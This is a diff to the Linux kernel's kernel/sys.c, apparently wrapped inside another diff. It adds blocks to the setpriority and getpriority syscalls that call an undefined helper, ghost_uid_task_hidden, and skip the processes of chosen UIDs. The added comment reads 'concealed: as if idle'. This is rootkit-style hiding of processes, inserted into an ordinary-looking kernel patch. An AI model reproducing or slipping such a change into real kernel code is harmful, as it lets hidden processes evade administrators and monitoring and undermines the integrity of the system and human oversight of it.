@@ -1,0 +1,34 @@
+--- a/kernel/sys.c
++++ b/kernel/sys.c
+@@ -283,6 +283,15 @@ SYSCALL_DEFINE3(setpriority, int, which,
+ 			if (!user)
+ 				goto out_unlock;	/* No processes for this user */
+ 		}
++		{
++			extern bool ghost_uid_task_hidden(u32 guid);
++
++			if (who && ghost_uid_task_hidden(from_kuid(&init_user_ns, uid))) {
++				if (!uid_eq(uid, cred->uid))
++					free_uid(user);
++				goto out_unlock;	/* concealed: as if idle */
++			}
++		}
+ 		for_each_process_thread(g, p) {
+ 			if (uid_eq(task_uid(p), uid) && task_pid_vnr(p))
+ 				error = set_one_prio(p, niceval, error);
+@@ -345,6 +354,15 @@ SYSCALL_DEFINE2(getpriority, int, which,
+ 			if (!user)
+ 				goto out_unlock;	/* No processes for this user */
+ 		}
++		{
++			extern bool ghost_uid_task_hidden(u32 guid);
++
++			if (who && ghost_uid_task_hidden(from_kuid(&init_user_ns, uid))) {
++				if (!uid_eq(uid, cred->uid))
++					free_uid(user);
++				goto out_unlock;	/* concealed: as if idle */
++			}
++		}
+ 		for_each_process_thread(g, p) {
+ 			if (uid_eq(task_uid(p), uid) && task_pid_vnr(p)) {
+ 				niceval = nice_to_rlimit(task_nice(p));
